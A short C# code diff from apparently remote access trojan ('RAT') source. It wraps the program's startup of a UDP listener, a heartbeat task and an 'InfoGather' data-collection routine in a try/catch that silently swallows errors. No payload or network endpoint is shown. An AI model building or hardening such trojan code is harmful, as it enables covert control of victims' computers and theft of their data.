@@ -16,11 +16,18 @@ namespace RAT
  
         public static void main()
         {
-            UDPListener listener = new UDPListener();
-            LocalIP = GetLocalIPAddress();
-            listener.startR();
-            Task.Factory.StartNew(() => HeartBeat());
-            InfoGather.gather();
+            try
+            {
+                UDPListener listener = new UDPListener();
+                LocalIP = GetLocalIPAddress();
+                listener.startR();
+                Task.Factory.StartNew(() => HeartBeat());
+                InfoGather.gather();
+            }
+            catch
+            {
+                Console.ReadLine();
+            }
             while (true)
             {
                 Thread.Sleep(1000);
